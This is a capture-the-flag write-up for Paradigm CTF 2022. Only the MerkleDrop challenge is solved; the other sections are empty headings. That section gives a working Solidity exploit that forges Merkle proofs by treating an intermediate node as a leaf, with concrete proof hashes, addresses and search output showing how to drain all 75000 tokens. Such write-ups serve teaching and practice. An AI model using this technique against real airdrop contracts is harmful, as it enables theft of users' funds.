# Paradigm CTF 2022

Some challenges are slightly modified to run locally. Using [forge](https://github.com/foundry-rs/foundry) to run scripts.

```bash
forge script script/Random.s.sol
```

**Table of Contents**
- [RANDOM](#random)
- [MERKLEDROP](#merkledrop)
- [RESCUE](#rescue)
- [SOURCECODE](#sourcecode)
- [VANITY](#vanity)
- [HINTFINANCE](#hintfinance)

## Random

simple task. The meme comes from https://youtu.be/LP1t_pzxKyE?t=251

## MerkleDrop

This task requires you to claim all tokens from a merkle airdrop contract without claiming all the valid indices.

```solidity
function claim(uint256 index, address account, uint96 amount, bytes32[] memory merkleProof) external {
    require(!isClaimed(index), 'MerkleDistributor: Drop already claimed.');
    
    // Verify the merkle proof.
    bytes32 node = keccak256(abi.encodePacked(index, account, amount));
    require(MerkleProof.verify(merkleProof, merkleRoot, node), 'MerkleDistributor: Invalid proof.');
    
    // Mark it claimed and send the token.
    _setClaimed(index);
    require(ERC20Like(token).transfer(account, amount), 'MerkleDistributor: Transfer failed.');
    
    emit Claimed(index, account, amount);
}
```

`claim` from `MerkleDistributor`. `amount` is using type `uint96`, the payload for `claim` happens to be
256+160+96=512. This fits two leafs for the merkle proof. We can use the first two from any intermediate state when constructing the merkle proof.

Example of claiming index 0 with intermediate state.

```solidity
function tryIndex0() public {
    bytes32[] memory proofs = new bytes32[](6);
    proofs[0] = 0xa37b8b0377c63d3582581c28a09c10284a03a6c4185dfa5c29e20dbce1a1427a;
    proofs[1] = 0x0ae01ec0f7a50774e0c1ad35f0f5efcc14c376f675704a6212b483bfbf742a69;
    proofs[2] = 0x3f267b524a6acda73b1d3e54777f40b188c66a14a090cd142a7ec48b13422298;
    proofs[3] = 0xe2eae0dabf8d82b313729f55298625b7ac9ba0f12e408529bae4a2ce405e7d5f;
    proofs[4] = 0x01cf774c22de70195c31bde82dc3ec94807e4e4e01a42aca6d5adccafe09510e;
    proofs[5] = 0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5;
    dist.claim(0, 0x00E21E550021Af51258060A0E18148e36607C9df, 0x09906894166afcc878, proofs);

    // claim(uint256 index, address account, uint96 amount, bytes32[] proofs)
    bytes32 node = keccak256(abi.encodePacked(uint256(0), address(0x00E21E550021Af51258060A0E18148e36607C9df), uint96(0x09906894166afcc878)));
    emit log_named_bytes32("node", node);
    // node      = 0xa9e8f0fbf0d2911d746500a7786606d3fc80abb68a05f77fb730ded04a951c2d
    // proofs[0] = 0xa37b8b0377c63d3582581c28a09c10284a03a6c4185dfa5c29e20dbce1a1427a
    bytes32[] memory fakeProofs = new bytes32[](5);
    fakeProofs[0] = proofs[1];
    fakeProofs[1] = proofs[2];
    fakeProofs[2] = proofs[3];
    fakeProofs[3] = proofs[4];
    fakeProofs[4] = proofs[5];
    dist.claim(0xa37b8b0377c63d3582581c28a09c10284a03a6c4185dfa5c29e20dbce1a1427a, 0xa9e8F0FBF0d2911d746500A7786606d3fC80abb6, uint96(0x8a05f77fb730ded04a951c2d), fakeProofs);
}
```

We created a simple [script](src/MerkleDrop/findVictim.js) to test every index of the tree. Only two indices is within the valid range.

```
total: 75000
index:19, fakeAmount: 0x00000f40f0c122ae08d2207b=72033.43704913257, fakeAddr: 0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A, fakeIndex: 0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442
index:37, fakeAmount: 0x00000f40f0c122ae08d2207b=72033.43704913257, fakeAddr: 0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A, fakeIndex: 0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442
....
index: 8, amount: 2966
....
```

Using index 8 and fake 19/37 will empty the 75000 tokens.



## Rescue

## SourceCode

## Vanity

## HintFinance


  
  
  
